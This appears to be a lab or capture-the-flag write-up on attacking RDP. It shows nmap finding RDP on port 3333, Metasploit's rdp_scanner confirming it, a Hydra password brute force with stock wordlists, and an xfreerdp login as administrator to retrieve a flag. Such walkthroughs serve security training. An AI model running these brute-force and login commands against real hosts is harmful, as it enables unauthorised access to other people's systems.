# Exploiting RDP

### Tools
**xRDP**\
It lets you connect to a Linux desktop using the Windows Remote Desktop app — just like connecting to another Windows machine.
So if I'm on Windows and want to control a Linux machine’s graphical desktop (GUI), xRDP makes that possible using RDP.

Find port RDP is running
```bash
# See on which port RDP is running
# Default port 3389 isn't open but 3333 is suspicious
└─# nmap -sV  10.0.20.145 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-16 08:00 IST
Nmap scan report for demo.ine.local (10.0.20.145)
Host is up (0.0029s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3333/tcp  open  ssl/dec-notes?
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49155/tcp open  msrpc          Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.06 seconds
```

```bash
# On another Tab, start Metasploit
msf6 > search rdp_scanner
msf6 > use 0
msf6 auxiliary(scanner/rdp/rdp_scanner) > set RHOSTS 10.0.20.145
RHOSTS => 10.0.20.145
msf6 auxiliary(scanner/rdp/rdp_scanner) > set RPORT 3333
RPORT => 3333

msf6 auxiliary(scanner/rdp/rdp_scanner) > run

[*] 10.0.20.145:3333      - Detected RDP on 10.0.20.145:3333      (name:WIN-OMCNBKR66MN) (domain:WIN-OMCNBKR66MN) (domain_fqdn:WIN-OMCNBKR66MN) (server_fqdn:WIN-OMCNBKR66MN) (os_version:6.3.9600) (Requires NLA: Yes)
[*] 10.0.20.145:3333      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


Bruteforce with Hydra
```bash
# New tab
# `-L` user file
# `-P` passwordfile
# `-s` port
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.0.20.145 -s 3333

# Access to the target 
─# xfreerdp /u:administrator /p:qwertyuiop /v:10.0.20.145:3333           
[08:22:30:757] [46341:46342] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[08:22:30:757] [46341:46342] [WARN][com.freerdp.crypto] - CN = WIN-OMCNBKR66MN
[08:22:31:862] [46341:46342] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: Asia/Kolkata
[08:22:31:063] [46341:46342] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[08:22:31:063] [46341:46342] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[08:22:31:078] [46341:46342] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[08:22:31:079] [46341:46342] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx

# After window popped up, explore files and find text file with flag!
port-number-3333
```
